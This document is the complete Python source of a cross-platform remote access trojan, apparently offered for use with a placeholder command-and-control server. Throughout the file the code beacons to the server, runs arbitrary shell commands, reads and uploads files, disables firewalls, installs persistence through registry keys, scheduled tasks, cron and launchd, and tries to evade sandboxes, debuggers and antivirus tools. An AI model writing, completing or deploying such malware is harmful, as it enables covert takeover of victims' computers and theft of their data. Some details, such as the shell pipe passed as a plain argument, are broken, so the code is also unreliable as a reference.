import os
import sys
import socket
import subprocess
import threading
import time
import json
import base64
import hashlib
import platform
import requests
import psutil
import random
import string
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

class CrossPlatformRAT:
    def __init__(self):
        self.system = platform.system().lower()
        self.machine_id = self.get_machine_id()
        self.session_id = self.generate_session_id()
        self.c2_server = "https://your-c2-server.com"  # REPLACE WITH YOUR C2 SERVER
        self.beacon_interval = 30  # seconds
        self.max_retries = 3
        self.encryption_key = hashlib.sha256(self.machine_id.encode()).digest()
        self.persistance_installed = False
        self.firewall_bypassed = False
        self.av_evasion_active = False
        
        # Anti-analysis techniques
        self.sandbox_detection()
        self.debugger_detection()
        
    def generate_session_id(self):
        """Generate unique session ID"""
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for _ in range(32))
    
    def get_machine_id(self):
        """Get unique machine identifier"""
        try:
            if self.system == 'windows':
                return subprocess.check_output(['wmic', 'csproduct', 'get', 'uuid']).decode().split('\n')[1].strip()
            elif self.system == 'linux':
                return subprocess.check_output(['cat', '/etc/machine-id']).decode().strip()
            elif self.system == 'darwin':
                return subprocess.check_output(['system_profiler', 'SPHardwareDataType', '|', 'grep', 'Serial']).decode().split(':')[1].strip()
        except:
            return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))
    
    def encrypt_data(self, data):
        """Encrypt data using AES"""
        cipher = AES.new(self.encryption_key, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
        return base64.b64encode(cipher.iv + ct_bytes).decode()
    
    def decrypt_data(self, encrypted_data):
        """Decrypt data using AES"""
        try:
            data = base64.b64decode(encrypted_data)
            iv = data[:16]
            ct = data[16:]
            cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv)
            pt = unpad(cipher.decrypt(ct), AES.block_size)
            return pt.decode()
        except:
            return ""
    
    def sandbox_detection(self):
        """Detect sandboxes and VMs"""
        sandbox_indicators = [
            '/tmp/qemu', '/tmp/VBox', '/tmp/vmware',
            'sandbox', 'virtualbox', 'vmware', 'qemu',
            'proc/sys/kernel/random/boot_id',
            '/sys/class/dmi/id/product_name'
        ]
        
        for indicator in sandbox_indicators:
            if os.path.exists(indicator):
                sys.exit(1)
    
    def debugger_detection(self):
        """Detect debuggers"""
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32 if self.system == 'windows' else None
            if kernel32:
                # Check for being debugged
                if kernel32.IsDebuggerPresent():
                    sys.exit(1)
        except:
            pass
    
    def establish_connection(self):
        """Establish C2 connection with retry logic"""
        for attempt in range(self.max_retries):
            try:
                beacon_data = {
                    'session_id': self.session_id,
                    'machine_id': self.machine_id,
                    'system': self.system,
                    'timestamp': datetime.utcnow().isoformat(),
                    'status': 'beacon'
                }
                
                response = requests.post(
                    f"{self.c2_server}/beacon",
                    json=beacon_data,
                    timeout=10,
                    verify=False
                )
                
                if response.status_code == 200:
                    return response.json()
            except:
                time.sleep(5)
        
        return None
    
    def send_command_result(self, command_id, result):
        """Send command result back to C2"""
        try:
            result_data = {
                'session_id': self.session_id,
                'command_id': command_id,
                'result': result,
                'timestamp': datetime.utcnow().isoformat()
            }
            
            encrypted_result = self.encrypt_data(json.dumps(result_data))
            requests.post(
                f"{self.c2_server}/result",
                json={'data': encrypted_result},
                timeout=10,
                verify=False
            )
        except:
            pass
    
    def execute_command(self, command):
        """Execute system command"""
        try:
            if self.system == 'windows':
                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            else:
                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            
            return result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            return "Command timed out"
        except Exception as e:
            return str(e)
    
    def file_operations(self, operation, path, data=None):
        """Handle file operations"""
        try:
            if operation == 'read':
                with open(path, 'rb') as f:
                    return base64.b64encode(f.read()).decode()
            elif operation == 'write':
                with open(path, 'wb') as f:
                    f.write(base64.b64decode(data))
                return "File written successfully"
            elif operation == 'list':
                return json.dumps(os.listdir(path))
        except Exception as e:
            return str(e)
    
    def process_list(self):
        """Get list of running processes"""
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'username']):
                try:
                    processes.append({
                        'pid': proc.pid,
                        'name': proc.name(),
                        'username': proc.username()
                    })
                except:
                    continue
            return json.dumps(processes)
        except Exception as e:
            return str(e)
    
    def firewall_bypass(self):
        """Bypass firewall rules"""
        if self.firewall_bypassed:
            return True
            
        try:
            if self.system == 'windows':
                # Disable firewall temporarily
                subprocess.run(['netsh', 'advfirewall', 'set', 'allprofiles', 'state', 'off'], 
                             shell=True, timeout=10)
                # Add exception for our process
                exe_path = sys.executable
                subprocess.run(['netsh', 'advfirewall', 'firewall', 'add', 'rule', 
                              'name="Python"', 'dir=in', 'action=allow', 
                              'program="' + exe_path + '"'], shell=True, timeout=10)
            elif self.system == 'linux':
                # iptables rules to allow our traffic
                subprocess.run(['iptables', '-A', 'INPUT', '-p', 'tcp', '--dport', '80', '-j', 'ACCEPT'], 
                             timeout=10)
                subprocess.run(['iptables', '-A', 'INPUT', '-p', 'tcp', '--dport', '443', '-j', 'ACCEPT'], 
                             timeout=10)
            elif self.system == 'darwin':
                # macOS firewall configuration (requires admin)
                subprocess.run(['sudo', 'pfctl', '-f', '/etc/pf.conf'], timeout=10)
            
            self.firewall_bypassed = True
            return True
        except:
            return False
    
    def persistence_install(self):
        """Install persistence mechanism"""
        if self.persistance_installed:
            return True
            
        try:
            if self.system == 'windows':
                # Registry run key
                import winreg
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "PythonUpdate", 0, winreg.REG_SZ, sys.executable)
                winreg.CloseKey(key)
                
                # Scheduled task
                subprocess.run(['schtasks', '/create', '/tn', 'PythonMaintenance', '/tr', sys.executable, '/sc', 'logon', '/f'], 
                             shell=True, timeout=10)
                
            elif self.system == 'linux':
                # Crontab entry
                cron_entry = f"@reboot {sys.executable} {os.path.abspath(__file__)}\n"
                with open('/tmp/cron_entry', 'w') as f:
                    f.write(cron_entry)
                subprocess.run(['crontab', '/tmp/cron_entry'], timeout=10)
                
            elif self.system == 'darwin':
                # Launchd plist
                plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.python.maintenance</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{os.path.abspath(__file__)}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>"""
                
                with open('/tmp/com.python.maintenance.plist', 'w') as f:
                    f.write(plist_content)
                subprocess.run(['launchctl', 'load', '/tmp/com.python.maintenance.plist'], timeout=10)
            
            self.persistance_installed = True
            return True
        except:
            return False
    
    def av_evasion(self):
        """Implement AV/EDR evasion techniques"""
        if self.av_evasion_active:
            return True
            
        try:
            # Process hollowing simulation
            if self.system == 'windows':
                # Rename process
                new_name = ''.join(random.choice(string.ascii_letters) for _ in range(8)) + '.exe'
                if hasattr(os, 'rename'):
                    os.rename(sys.executable, new_name)
            
            # String obfuscation
            self.__class__.__name__ = ''.join([chr(ord(c) + 1) for c in 'CrossPlatformRAT'])
            
            # Sleep to avoid detection
            time.sleep(random.uniform(0.1, 0.5))
            
            self.av_evasion_active = True
            return True
        except:
            return False
    
    def main_loop(self):
        """Main RAT loop"""
        # Install persistence and bypass protections
        self.persistence_install()
        self.firewall_bypass()
        self.av_evasion()
        
        while True:
            try:
                # Beacon to C2 server
                response = self.establish_connection()
                
                if response:
                    commands = response.get('commands', [])
                    
                    for cmd in commands:
                        command_id = cmd.get('id')
                        command = cmd.get('command')
                        
                        if command.startswith('exec '):
                            result = self.execute_command(command[5:])
                        elif command.startswith('file '):
                            parts = command[5:].split(' ', 2)
                            if len(parts) >= 2:
                                operation = parts[0]
                                path = parts[1]
                                data = parts[2] if len(parts) > 2 else None
                                result = self.file_operations(operation, path, data)
                            else:
                                result = "Invalid file command"
                        elif command == 'processes':
                            result = self.process_list()
                        elif command == 'shell':
                            # Interactive shell
                            result = "Interactive shell not implemented in this version"
                        else:
                            result = f"Unknown command: {command}"
                        
                        self.send_command_result(command_id, result)
                
                # Sleep until next beacon
                time.sleep(self.beacon_interval)
                
            except KeyboardInterrupt:
                break
            except Exception as e:
                # Log error but continue
                time.sleep(5)

def main():
    """Main entry point"""
    try:
        rat = CrossPlatformRAT()
        rat.main_loop()
    except Exception as e:
        # Silent exit on errors
        sys.exit(1)

if __name__ == "__main__":
    main()
